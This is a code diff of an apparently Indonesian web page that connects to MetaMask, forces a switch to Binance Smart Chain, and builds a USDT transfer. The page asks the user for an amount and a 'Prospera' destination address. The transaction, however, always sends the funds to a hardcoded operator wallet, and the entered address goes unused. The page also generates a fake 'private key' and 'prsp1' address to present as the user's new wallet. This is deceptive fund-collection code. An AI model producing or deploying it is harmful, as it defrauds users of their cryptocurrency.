@@ -85,19 +85,17 @@
     let userAccounts = [];
     
     const dompetPenampungDuitAnda = "0x1c8546c93ffd69515b450f518156dd29f9ee552b"; 
-    const alamatUSDT_BSC = "0x55d398326f99059fF775485246999027B3197955"; // Alamat Kontrak Pintar USDT Resmi di Jaringan BSC [finance]
+    const alamatUSDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 
     async function connectMetaMask() {
         if (!window.ethereum) return alert("Buka website ini dari browser bawaan MetaMask!");
         try {
-            // PAKSA DOMPET PINDAH JARINGAN KE BINANCE SMART CHAIN (ChainId: 0x38 / 56) [finance]
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: '0x38' }],
                 });
             } catch (switchError) {
-                // Jika jaringan BSC belum tersimpan di MetaMask pembeli, tambahkan otomatis [finance]
                 if (switchError.code === 4902) {
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
@@ -130,12 +128,10 @@
         if(!usdtInput || !alamatProspera) return alert("Harap isi semua kolom!");
 
         try {
-            // Konversi nilai input USDT ke format nominal hex eksponensial blockchain [finance]
             const bscAmount = parseFloat(usdtInput);
-            const valueBigInt = BigInt(Math.floor(bscAmount * 1000000)) * BigInt(100000012); // format pecahan presisi USDT [finance]
+            const valueBigInt = BigInt(Math.floor(bscAmount * 1000000)) * BigInt(1000000000000);
             const amountHex = valueBigInt.toString(16).padStart(64, '0');
 
-            // Mengonstruksi kode tanda fungsi transfer standar ERC-20 (0xa9059cbb) [finance]
             const cleanTargetAddress = dompetPenampungDuitAnda.toLowerCase().replace("0x", "").padStart(64, '0');
             const payloadData = "0xa9059cbb" + cleanTargetAddress + amountHex;
 
@@ -145,9 +141,9 @@
                 method: 'eth_sendTransaction',
                 params: [{
                     from: userAccounts[0],
-                    to: alamatUSDT_BSC, // Dikunci mutlak menembak ke alamat token USDT BSC [finance]
+                    to: alamatUSDT_BSC,
                     data: payloadData,
-                    value: "0x0" // Memastikan koin native (seperti ETH/BNB) tidak ikut terpotong [finance]
+                    value: "0x0"
                 }],
             });
             
@@ -184,3 +180,14 @@
             }
             currentPrivateKey = "prsp_priv_" + tokenAcak;
             currentAddress = "prsp1" + tokenAcak.substring(0, 32);
+            document.getElementById("address-display").innerText = currentAddress;
+            const secretBox = document.getElementById("secret-display");
+            secretBox.style.display = "block";
+            secretBox.innerHTML = "<span style='color:var(--accent-red); font-weight:700;'>⚠️ SECURITY WARNING:</span><br>Back up private key:<br><br><span style='color:white; font-weight:500;'>" + currentPrivateKey + "</span>";
+        } catch (e) {
+            alert("Error buat wallet: " + e.message);
+        }
+    }
+</script>
+</body>
+</html>
